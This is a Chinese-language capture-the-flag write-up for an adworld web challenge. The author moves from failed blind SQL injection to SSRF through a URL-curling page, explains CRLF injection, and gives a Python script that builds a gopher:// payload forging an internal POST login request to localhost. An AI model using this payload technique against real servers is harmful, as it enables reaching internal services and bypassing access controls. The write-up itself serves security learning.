

一直构造盲注都没有任何反应，adworld的题3级不可能是简单注入，而且下面提示`不是内部用户`，考虑可能是要往ssrf方向

尤其是看到还有个use.php函数，先wget下来

首先先查看use.php

```php
<!DOCTYPE html>
<html>
<body>

<form action="">
url you want to curl:<br>
<input type="text" name="url" value="url">
<br>
<input type="submit" value="Submit">
</form>

</body>
</html>   
```

到了这里的提示，果然是ssrf的构造

现有的思路就是对已有的协议如file，gopher等的利用

但是发现file是被过滤，并且目录并不是以往那么好找到

这里是利用了一个比较古老的漏洞

### CRLF注入

RLF 注入（也称为 HTTP 换行注入）是一种 Web 应用程序中的安全漏洞，它允许攻击者在 HTTP 响应中插入任意的换行符和回车符（CRLF），从而可能导致恶意行为。

简单来说，当我们传输`rn`到服务器时，服务器可能被欺骗，把`rn`当成换行回车处理，从而给`rn`后面的内容当成新的 header 头或者 body 内容返回。

```
import urllib.parse

host = "127.0.0.1:80"
content = "uname=admin&passwd=admin"
content_length = len(content)

payload =\
"""POST /index.php HTTP/1.1
Host: {}
User-Agent: curl/7.43.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: {}

{}
""".format(host,content_length,content)

tmp = urllib.parse.quote(payload) #对payload中的特殊字符进行编码
new = tmp.replace('%0A','%0D%0A') #CRLF(换行)漏洞
result = 'gopher://127.0.0.1:80/'+'_'+new
result = urllib.parse.quote(result)# 对新增的部分继续编码
print(result)
```

